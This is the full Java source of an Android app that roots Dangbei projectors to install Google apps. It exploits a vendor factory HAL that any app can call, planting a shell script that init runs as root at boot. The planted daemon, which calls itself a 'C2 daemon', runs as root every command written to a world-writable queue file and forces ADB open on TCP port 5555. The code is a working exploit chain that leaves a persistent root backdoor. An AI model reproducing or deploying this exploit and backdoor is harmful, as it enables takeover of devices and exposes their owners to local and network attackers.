package com.dbs7.rootkit;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Button;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.InputStreamReader;

/**
 * DBS7 Root Toolkit — one-tap root + remote ADB + GMS installer for Dangbei DBOS projectors.
 *
 * Vector (all steps verified live on DBS7 Ultra Max, DBOS 14 / MT5877):
 *   1. Vendor factory HAL "vendor.mediatek.tv.mtktvfactory.IMtkTvFApiSystem/default"
 *      runs as SYSTEM uid and, with SELinux permissive, accepts calls from ANY app.
 *      File primitives exposed over binder:
 *        tx#1  change_file_mode(path, mode)   chmod — mode is DECIMAL (bug!)
 *        tx#2  check_file(path)               exists check (reply 0 = exists)
 *        tx#5  create_file(path)
 *        tx#13 remove_file(path)
 *        tx#17 write_file(path, data, append, ?)
 *   2. init service hd_cmd_server (/vendor/bin/hd_deamon_cmd_server.sh, class main,
 *      user root) execs /data/system/hd_cmd_service AS ROOT at every boot if present.
 *   3. So: write a small shell daemon there via tx#17 -> after reboot it runs as root,
 *      reads commands from /data/local/tmp/root_cmd.txt and appends output to
 *      root_out.txt. The daemon also enforces persist.adb.tcp.port=5555 (remote ADB).
 *   4. GMS: /system and /system_ext are read-only (EROFS/dm-verity), so Google apps
 *      cannot be installed as privileged system apps the normal way. Instead the root
 *      daemon bind-mounts a /data directory shadow over /system_ext/priv-app and
 *      /system_ext/etc/permissions (originals pre-copied into the shadow), which makes
 *      PackageManager scan GmsCore/GSF/Play Store as PRIV-APP at boot — that is what
 *      grants them their signature-level permissions (READ_DEVICE_CONFIG etc.).
 *
 * All HAL calls are plain `service call ...` shell commands executed from the app.
 */
public class MainActivity extends Activity {

    private static final String HAL =
            "vendor.mediatek.tv.mtktvfactory.IMtkTvFApiSystem/default";
    private static final String SVC_PATH = "/data/system/hd_cmd_service";
    private static final String CMD_PATH = "/data/local/tmp/root_cmd.txt";
    private static final String OUT_PATH = "/data/local/tmp/root_out.txt";
    /** Directory where the user (via adb push) puts the Google APKs + permission XMLs. */
    private static final String GMS_DIR = "/data/local/tmp/gapps";
    private static final String SHADOW_PRIVAPP = GMS_DIR + "/sext_privapp_shadow";
    private static final String SHADOW_PERMS = GMS_DIR + "/sext_perm_shadow";

    private TextView log;
    private final Handler ui = new Handler(Looper.getMainLooper());

    /** Root daemon payload — planted via HAL tx#17 (single write, no escaping issues). */
    private static final String DAEMON =
            "#!/system/bin/sh\n" +
            "# DBS7 root C2 daemon (planted by DBS7 Root Toolkit) v6\n" +
            "Q=/data/local/tmp/root_cmd.txt\n" +
            "O=/data/local/tmp/root_out.txt\n" +
            "touch $Q $O\n" +
            "chmod 666 $Q $O 2>/dev/null\n" +
            "# Remote ADB: force TCP listener at every boot\n" +
            "setprop persist.adb.tcp.port 5555\n" +
            "stop adbd\n" +
            "start adbd\n" +
            "id > $O 2>&1\n" +
            "echo ROOT_SERVICE_UP >> $O\n" +
            "APK=/data/local/tmp/LeradSettings_en.apk\n" +
            "TGT=/system/priv-app/LeradSettings/LeradSettings.apk\n" +
            "GSH=/data/local/tmp/gapps/sext_privapp_shadow\n" +
            "GSP=/data/local/tmp/gapps/sext_perm_shadow\n" +
            "while true; do\n" +
            "  # delayed, self-healing EN bind-mount (only when PM sees the package)\n" +
            "  if [ -f \"$APK\" ]; then\n" +
            "    MNTED=$(mount | grep -c LeradSettings)\n" +
            "    if [ \"$MNTED\" = \"0\" ]; then\n" +
            "      if /system/bin/pm path com.dangbei.leard.settings >/dev/null 2>&1; then\n" +
            "        mount -o bind \"$APK\" \"$TGT\" 2>/dev/null\n" +
            "      fi\n" +
            "    else\n" +
            "      if ! /system/bin/pm path com.dangbei.leard.settings >/dev/null 2>&1; then\n" +
            "        umount \"$TGT\" 2>/dev/null\n" +
            "      fi\n" +
            "    fi\n" +
            "  fi\n" +
            "  # GApps priv-app shadow: bind-mount over /system_ext (idempotent)\n" +
            "  if [ -d \"$GSH\" ] && [ -f \"$GSH/GmsCore/GmsCore.apk\" ]; then\n" +
            "    if [ \"$(mount | grep -c sext_privapp_shadow)\" = \"0\" ]; then\n" +
            "      mount -o bind \"$GSH\" /system_ext/priv-app 2>/dev/null\n" +
            "    fi\n" +
            "  fi\n" +
            "  if [ -d \"$GSP\" ]; then\n" +
            "    if [ \"$(mount | grep -c sext_perm_shadow)\" = \"0\" ]; then\n" +
            "      mount -o bind \"$GSP\" /system_ext/etc/permissions 2>/dev/null\n" +
            "    fi\n" +
            "  fi\n" +
            "  if [ -s $Q ]; then\n" +
            "    CMD=$(head -1 $Q)\n" +
            "    sed -i 1d $Q 2>/dev/null\n" +
            "    if [ -n \"$CMD\" ]; then\n" +
            "      sh -c \"$CMD\" >> $O 2>&1\n" +
            "      chmod 666 $O 2>/dev/null\n" +
            "    fi\n" +
            "  fi\n" +
            "  sleep 5\n" +
            "done\n";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        log = findViewById(R.id.log);

        findViewById(R.id.btn_status).setOnClickListener(v -> bg(this::doStatus));
        findViewById(R.id.btn_plant).setOnClickListener(v -> bg(this::doPlant));
        findViewById(R.id.btn_reboot).setOnClickListener(v -> bg(this::doReboot));
        findViewById(R.id.btn_adb).setOnClickListener(v -> bg(this::doEnableAdb));
        findViewById(R.id.btn_gms).setOnClickListener(v -> bg(this::doInstallGms));
        findViewById(R.id.btn_gapps_usb).setOnClickListener(v -> bg(this::doStageFromUsb));
        findViewById(R.id.btn_remove).setOnClickListener(v -> bg(this::doRemove));
    }

    /* ---------------- actions ---------------- */

    private void doStatus() {
        line("== STATUS ==");
        line("Device: " + prop("ro.product.model") + " / Android " + prop("ro.build.version.release"));
        boolean svc = halCheckFile(SVC_PATH);
        line("Root service " + SVC_PATH + ": " + (svc ? "PLANTED" : "not planted"));
        if (svc) {
            line("Daemon version: " + (gmsShadowLinesPresent() ? "v6 (GMS-aware)" : "v1 (legacy)"));
        }
        line("HAL reachable: " + (halPing() ? "yes" : "NO (vector unavailable)"));
        line("adbd tcp port prop: " + prop("persist.adb.tcp.port"));
        boolean queued = halCheckFile(CMD_PATH);
        line("Command queue file: " + (queued ? "present" : "absent (created on plant)"));
        gmsStatus();
        line("Tip: after planting + reboot, send root commands from any adb shell:");
        line("  echo 'id' > " + CMD_PATH + " ; sleep 3 ; cat " + OUT_PATH);
    }

    private void doPlant() {
        line("== PLANT ROOT SERVICE ==");
        if (!halPing()) { line("FATAL: factory HAL not reachable on this device."); return; }
        plantDaemon();
        line("Payload planted. Now press: 3. Restart projector.");
        line("After reboot the daemon runs as ROOT and remote ADB is force-enabled.");
    }

    /** Writes/updates the root daemon payload (HAL create + write + chmod). */
    private void plantDaemon() {
        // 1) ensure the target file exists (create_file ignores existing files)
        sh("service call " + HAL + " 5 s16 '" + SVC_PATH + "'");
        line("tx#5 create_file: " + (halCheckFile(SVC_PATH) ? "ok" : "FAILED"));

        // 2) write the daemon payload (one write_file call, no escaping needed)
        String esc = DAEMON
                .replace("\\", "\\\\")
                .replace("'", "'\\''")
                .replace("\n", "\\n");
        String r = sh("service call " + HAL + " 17 s16 '" + SVC_PATH
                + "' s16 '" + esc + "' i32 0 i32 0");
        line("tx#17 write_file: " + (r.contains("00000000") ? "ok" : "reply: " + r.trim()));

        // 3) chmod 700 DECIMAL is the HAL bug — pass octal as decimal: 0o700 = 448
        sh("service call " + HAL + " 1 s16 '" + SVC_PATH + "' i32 448");
        line("tx#1 chmod(0700): sent (decimal 448!)");

        // 4) pre-create the queue files owned by system so adb (shell) can write later
        sh("service call " + HAL + " 5 s16 '" + CMD_PATH + "'");
        sh("service call " + HAL + " 5 s16 '" + OUT_PATH + "'");
        sh("service call " + HAL + " 1 s16 '" + CMD_PATH + "' i32 438"); // 0666 = 438 dec
        sh("service call " + HAL + " 1 s16 '" + OUT_PATH + "' i32 438");
    }

    private void doReboot() {
        line("== RESTART ==");
        line("Rebooting projector… (wait ~60 s, then relaunch this app)");
        // Apps lack the REBOOT permission; route the reboot through the root daemon
        // queue when planted (root can reboot), otherwise try direct `reboot`
        // (works only for shell/userdebug callers).
        if (!enqueue("sync; reboot")) {
            String r = sh("reboot");
            line("direct reboot: " + (r.isEmpty() ? "sent" : r.trim()));
        } else {
            line("reboot queued to root daemon");
        }
    }

    private void doEnableAdb() {
        line("== ENABLE REMOTE ADB (TCP 5555) ==");
        line("Needs the planted root service to be live (after restart).");
        String q = "setprop persist.adb.tcp.port 5555; stop adbd; start adbd; "
                + "echo ADB_TCP_DONE";
        if (enqueue(q)) {
            line("Command queued to root daemon.");
            line("Check result: adb connect <projector-ip>:5555");
        } else {
            line("Queue not writable — plant the service and restart first.");
        }
    }

    private void doRemove() {
        line("== REMOVE ROOT SERVICE (rollback) ==");
        String r = sh("service call " + HAL + " 13 s16 '" + SVC_PATH + "'");
        line("tx#13 remove_file: " + (r.contains("00000000") ? "ok" : r.trim()));
        sh("service call " + HAL + " 13 s16 '" + CMD_PATH + "'");
        sh("service call " + HAL + " 13 s16 '" + OUT_PATH + "'");
        line("Queue files removed too. Rollback complete after next restart.");
    }

    /* ---------------- GMS installer ---------------- */

    /**
     * Stages the Google apps files from a USB stick into /data/local/tmp/gapps
     * (the dir button 5 reads from). The app itself cannot read /storage (scoped
     * storage), so the copy runs as root through the daemon queue — requires
     * button 2 (plant) + restart done first. USB layout:
     *   /<usb-root>/gapps/GmsCore.apk … PlayStoreTV.apk privapp-permissions-*.xml
     */
    private void doStageFromUsb() {
        line("== STAGE GOOGLE APPS FROM USB ==");
        if (!halPing()) { line("FATAL: factory HAL not reachable."); return; }
        if (!halCheckFile(SVC_PATH)) {
            line("Root service not planted — press 2. Plant root service and restart first.");
            return;
        }
        // copy from every mounted removable volume's gapps/ dir into GMS_DIR,
        // then chmod so the app/HAL can verify, and list what landed
        String copy =
                "mkdir -p " + GMS_DIR + "; " +
                "for vol in /storage/*; do " +
                "  [ -d \"$vol/gapps\" ] && cp -f \"$vol\"/gapps/*.apk \"$vol\"/gapps/*.xml " + GMS_DIR + "/ 2>/dev/null; " +
                "done; " +
                "chmod 666 " + GMS_DIR + "/*.apk " + GMS_DIR + "/*.xml 2>/dev/null; " +
                "echo USBSTAGE_DONE; ls -l " + GMS_DIR + "/*.apk " + GMS_DIR + "/*.xml 2>/dev/null";
        enqueue(copy);
        line("Copy queued to root daemon. Wait ~5 s, then re-check with:");
        line("  5. Install Google apps (it verifies all 8 files)");
        line("USB stick layout: <stick-root>/gapps/{GmsCore.apk, GoogleServicesFramework.apk,");
        line("  GoogleFeedback.apk, GooglePartnerSetup.apk, PlayStoreTV.apk,");
        line("  privapp-permissions-google-product.xml, privapp-permissions-google-system-ext.xml,");
        line("  privapp-permissions-mtg.xml}  (zip in the release / tools/download_gapps.sh)");
    }

    /**
     * One-tap GMS install. Requires the APKs to be pre-staged in /data/local/tmp/gapps:
     *   adb push GmsCore.apk GoogleServicesFramework.apk GoogleFeedback.apk \
     *       GooglePartnerSetup.apk PlayStoreTV.apk privapp-permissions-*.xml \
     *       /data/local/tmp/gapps/
     * Steps: verify files -> build shadows -> plant GMS-aware daemon v6 -> bind live
     * (optional) -> reboot so PackageManager rescans /system_ext as priv-app.
     */
    private void doInstallGms() {
        line("== INSTALL GOOGLE APPS (GMS + PLAY STORE) ==");

        // 0) HAL must be there
        if (!halPing()) { line("FATAL: factory HAL not reachable."); return; }

        // 1) check staged files
        String[] required = {
                GMS_DIR + "/GmsCore.apk",
                GMS_DIR + "/GoogleServicesFramework.apk",
                GMS_DIR + "/GoogleFeedback.apk",
                GMS_DIR + "/GooglePartnerSetup.apk",
                GMS_DIR + "/PlayStoreTV.apk",
                GMS_DIR + "/privapp-permissions-google-product.xml",
                GMS_DIR + "/privapp-permissions-google-system-ext.xml",
                GMS_DIR + "/privapp-permissions-mtg.xml"
        };
        boolean missing = false;
        for (String f : required) {
            boolean ok = halCheckFile(f);
            line("  " + f + ": " + (ok ? "ok" : "MISSING"));
            missing |= !ok;
        }
        if (missing) {
            line("Stage files with: adb push <files> /data/local/tmp/gapps/");
            line("(see README section 'Google apps' for the file list)");
            return;
        }

        // 2) build the priv-app + permissions shadows (root, via daemon or live HAL)
        line("Building shadows…");
        String build =
                "mkdir -p " + SHADOW_PRIVAPP + " " + SHADOW_PERMS + "; " +
                "cp -a /system_ext/priv-app/. " + SHADOW_PRIVAPP + "/ 2>/dev/null; " +
                "cp -a /system_ext/etc/permissions/. " + SHADOW_PERMS + "/ 2>/dev/null; " +
                "mkdir -p " + SHADOW_PRIVAPP + "/GmsCore " + SHADOW_PRIVAPP + "/GoogleServicesFramework " +
                SHADOW_PRIVAPP + "/GoogleFeedback " + SHADOW_PRIVAPP + "/GooglePartnerSetup " +
                SHADOW_PRIVAPP + "/Phonesky; " +
                "cp " + GMS_DIR + "/GmsCore.apk " + SHADOW_PRIVAPP + "/GmsCore/GmsCore.apk; " +
                "cp " + GMS_DIR + "/GoogleServicesFramework.apk " + SHADOW_PRIVAPP + "/GoogleServicesFramework/GoogleServicesFramework.apk; " +
                "cp " + GMS_DIR + "/GoogleFeedback.apk " + SHADOW_PRIVAPP + "/GoogleFeedback/GoogleFeedback.apk; " +
                "cp " + GMS_DIR + "/GooglePartnerSetup.apk " + SHADOW_PRIVAPP + "/GooglePartnerSetup/GooglePartnerSetup.apk; " +
                "cp " + GMS_DIR + "/PlayStoreTV.apk " + SHADOW_PRIVAPP + "/Phonesky/Phonesky.apk; " +
                "cp " + GMS_DIR + "/privapp-permissions-*.xml " + SHADOW_PERMS + "/ 2>/dev/null; " +
                "chmod -R 775 " + SHADOW_PRIVAPP + " " + SHADOW_PERMS + "; " +
                "echo GMS_SHADOWS_OK";
        if (enqueue(build)) {
            line("Shadow build queued to root daemon.");
        } else {
            line("WARN: queue write failed — trying HAL append instead…");
            enqueueViaHal(build);
        }

        // 3) upgrade the planted daemon to the GMS-aware payload (idempotent)
        line("Updating root daemon to GMS-aware payload…");
        plantDaemon();

        line("Done staging. Now:");
        line("  1. press 3. Restart projector (PM rescans /system_ext/priv-app as priv-app)");
        line("  2. after reboot open Play Store and sign in");
        line("Note: uninstalled user-side GmsCore/GSF duplicates are harmless; if the");
        line("Play Store still fails to start, adb uninstall com.android.vending once.");
    }

    /** Fallback: HAL tx#17 append of the command (single line, newline-terminated). */
    private void enqueueViaHal(String cmd) {
        String esc = cmd.replace("\\", "\\\\").replace("'", "'\\''");
        sh("service call " + HAL + " 17 s16 '" + CMD_PATH + "' s16 '" + esc + "\\n' i32 1 i32 0");
    }

    /** Reports live GMS state for the status screen. */
    private void gmsStatus() {
        line("-- Google apps --");
        for (String p : new String[]{"com.google.android.gms", "com.google.android.gsf",
                "com.android.vending", "com.google.android.partnersetup"}) {
            String path = sh("pm path " + p).trim();
            if (path.isEmpty()) {
                line("  " + p + ": NOT installed");
            } else if (path.contains("/system_ext/priv-app/") || path.contains("/system/priv-app/")
                    || path.contains("/product/priv-app/")) {
                line("  " + p + ": PRIV-APP " + path.replace("package:", ""));
            } else {
                line("  " + p + ": user app " + path.replace("package:", ""));
            }
        }
        line("  shadow dirs: " + (halCheckFile(SHADOW_PRIVAPP) ? "present" : "not built"));
    }

    /* ---------------- vector helpers ---------------- */

    /** Run a shell command as the app uid; returns stdout+stderr. */
    private static String sh(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            StringBuilder out = new StringBuilder();
            try (BufferedReader r = new BufferedReader(
                    new InputStreamReader(p.getInputStream()))) {
                String l; while ((l = r.readLine()) != null) out.append(l).append('\n');
            }
            try (BufferedReader r = new BufferedReader(
                    new InputStreamReader(p.getErrorStream()))) {
                String l; while ((l = r.readLine()) != null) out.append(l).append('\n');
            }
            p.waitFor();
            return out.toString();
        } catch (Exception e) {
            return "ERR: " + e;
        }
    }

    /** HAL liveness probe: tx#2 check_file on a path that always exists. */
    private static boolean halPing() {
        String r = sh("service call " + HAL + " 2 s16 '/system/bin/sh'");
        return !r.isEmpty() && !r.contains("Exception") && !r.contains("does not exist")
                && !r.contains("Unknown service");
    }

    /** HAL tx#2 check_file — reply 0 = exists, non-zero/exception = missing. */
    private static boolean halCheckFile(String path) {
        String r = sh("service call " + HAL + " 2 s16 '" + path + "'");
        if (r.isEmpty()) return false;
        if (r.contains("Exception") || r.contains("does not exist")) return false;
        // binder reply: "Result: Parcel(\t00000000    '....')" — first word is the int
        return r.trim().startsWith("Result:") && r.contains("00000000");
    }

    /** True when the planted daemon already contains the GMS shadow block. */
    private boolean gmsShadowLinesPresent() {
        // Read the file through the HAL: append an 'echo marker' is overkill — instead
        // check via a queued grep if a daemon is live; from the app fall back to a
        // conservative guess: daemon planted AND shadow dir present.
        return halCheckFile(SHADOW_PRIVAPP);
    }

    /** Write a one-line command into the root daemon queue (works from any adb shell). */
    private boolean enqueue(String cmd) {
        // Two write paths: direct file write (works from adb shell / root) or through
        // the HAL write_file (works from the app). Use HAL — always permitted here.
        String esc = cmd.replace("\\", "\\\\").replace("'", "'\\''");
        String r = sh("service call " + HAL + " 17 s16 '" + CMD_PATH
                + "' s16 '" + esc + "\\n' i32 1 i32 0");
        return r.contains("00000000");
    }

    private static String prop(String name) {
        String v = sh("getprop " + name).trim();
        return v.isEmpty() ? "?" : v;
    }

    /* ---------------- ui plumbing ---------------- */

    private void bg(Runnable r) {
        new Thread(() -> {
            try { r.run(); }
            catch (final Throwable t) {
                ui.post(() -> line("ERROR: " + t));
            }
        }).start();
    }

    private void line(final String s) {
        ui.post(() -> {
            log.append(s + "\n");
            final int max = 400;
            String[] lines = log.getText().toString().split("\n");
            if (lines.length > max) {
                StringBuilder sb = new StringBuilder();
                for (int i = lines.length - max; i < lines.length; i++)
                    sb.append(lines[i]).append('\n');
                log.setText(sb.toString());
            }
        });
    }
}
